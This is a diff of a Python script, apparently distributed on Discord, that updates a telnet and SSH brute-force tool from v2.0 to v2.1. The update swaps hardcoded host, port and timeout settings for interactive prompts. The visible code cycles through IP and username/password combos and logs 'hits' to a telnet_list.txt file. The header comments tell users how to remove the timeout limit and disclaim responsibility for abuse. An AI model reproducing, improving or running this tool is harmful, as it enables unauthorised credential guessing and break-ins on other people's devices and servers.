@@ -1,4 +1,4 @@
-# TELNET AND SSH BRUTEFORCE v2.0
+# TELNET AND SSH BRUTEFORCE v2.1
 # Made by: weasley 2#2909
 
 # Download python3 and run the file as showcased in the video.
@@ -6,7 +6,7 @@
 # UPDATE: New things added to the bruteforcing method now it separates telnet and SSH ports.
 # You can now change the combos and also uncap the timeout as you requested it, so here you go.
 # Keep in mind it can crash your VPS if it overheats, so don't mess around with it (for your good).
-# If you want to uncap the timeout remove or comment the following line "and timeout_int >= 2".
+# If you want to uncap the timeout remove or comment the following line "and int(timeout) >= 2".
 # For educational purposes only! If you abuse it or use it inappropriate I don't take any responsibility.
 
 #ALL RIGHTS RESERVED, COPYRIGHT AND TRADEMARK.
@@ -17,15 +17,10 @@ import sys
 import time
 import random
 
-# important variables (edit these if you want to...)
 err_code = 0
-host = 'localhost'
-port_int = 23
-timeout_int = 3
-
-# don't touche! :P
-timeout = str(timeout_int)
-port = str(port_int)
+host = (input('Enter Host(default localhost): '))
+port= input('Enter Port(23 telnet or 22 SSH): ')
+timeout= input('Enter timeout(default 3): ')
 
 # arrays with combos (customize your pulls!)
 combo_user = [
@@ -74,7 +69,7 @@ class bruteforce:
 		self.user = user
 		self.passw = passw
 	def is_usable(self):
-		if len(self.ip) > 1 and len(self.ip) >= 7 and self.ip.__contains__('.') and self.port == "23" and timeout_int <= 61 and timeout_int >= 2: # <--- remove or comment this!
+		if len(self.ip) > 1 and len(self.ip) >= 7 and self.ip.__contains__('.') and self.port == "23" and int(timeout) <= 61 and int(timeout) >= 2: # <--- remove or comment this!
 			file = open("telnet_list.txt", "a")
 			file.write(self.ip + ":" + self.port + " " + self.user + ":" + self.passw + "\n")
 			return(
@@ -119,7 +114,7 @@ def check_validity():
 print("\033[H\033[J")
 print("\033[35mStatus: \033[32mConnected to: \033[0m"+ host +"\n\033[35mPort: \033[0m" + port+ "\n\033[35mTimeout: \033[0m" + timeout+ "\n\033[35mError Code: \033[0m"+str(err_code))
 for single_ip in sfw_combo:
-	time.sleep(timeout_int)
+	time.sleep(int(timeout))
 	random_user = random.choice(combo_user)
 	random_passw = random.choice(combo_passw)
 	config = (bruteforce(single_ip, port, random_user, random_passw))
